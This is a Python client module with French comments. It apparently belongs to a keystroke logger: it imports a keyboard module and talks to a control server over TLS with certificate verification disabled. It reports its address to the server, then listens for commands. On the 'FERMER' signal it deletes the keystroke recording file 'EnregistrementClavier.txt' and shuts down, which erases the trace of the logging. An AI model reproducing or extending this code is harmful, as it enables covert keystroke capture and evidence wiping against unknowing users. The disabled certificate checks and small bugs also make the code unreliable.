import socket
import ssl
from .Clavier import *


def EchangeIPPortEcouteClient(IPClient, PORTClientSignal):
    # Création du socket client
    ClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Création d'un contexte SSL/TLS
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        # Connexion au serveur avec SSL/TLS
        with context.wrap_socket(ClientSocket, server_hostname='127.0.0.1') as SecureClientSocket:
            # Connexion au serveur
            IPServeur = '127.0.0.1' 
            PORTServeur = 12345

            SecureClientSocket.connect((IPServeur, PORTServeur))
            print(f"Connecté au serveur {IPServeur}:{PORTServeur}.")

            # Envoi de l'adresse IP et du port d'écoute au serveur
            Message = f"{IPClient}:{PORTClientSignal}\ADRESSEIPPORT"
            SecureClientSocket.sendall(Message.encode('utf-8'))
            print(f"Adresse IP et port d'écoute envoyés au serveur : {Message}")

    except Exception as e:
        print(f"Erreur lors de l'échange d'adresse IP et de port avec le serveur : {e}")

    finally:
        # Fermeture du socket client
        ClientSocket.close()

def EcouteSignalServeur():
    IP = "127.0.0.1"
    PORT = 50000

    # Création du socket
    ClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Liaison du socket à l'adresse IP et au port spécifiés
        ClientSocket.bind((IP, PORT))
        print(f"Client en écoute sur {IP}:{PORT} pour les signaux du serveur.")

        # Attendre une connexion entrante
        ClientSocket.listen(1)
        conn, addr = ClientSocket.accept()
        print(f"Connecté au serveur {addr} pour écouter les signaux.")

        while True:
            # Réception des messages du serveur
            Message = conn.recv(1024).decode("utf-8")
            print(f"Message reçu du serveur : {Message}")

            # Vérification si le message est un signal de fermeture
            if Message == "FERMER":
                print("Signal de fermeture reçu du serveur. Arrêt du client.")
                SuppressionEnregistrementClavier("EnregistrementClavier.txt")
                ArretClient()

    except Exception as e:
        print(f"Erreur lors de l'écoute des signaux du serveur : {e}")

    finally:
        # Fermeture de la connexion et du socket
        conn.close()
        ClientSocket.close()
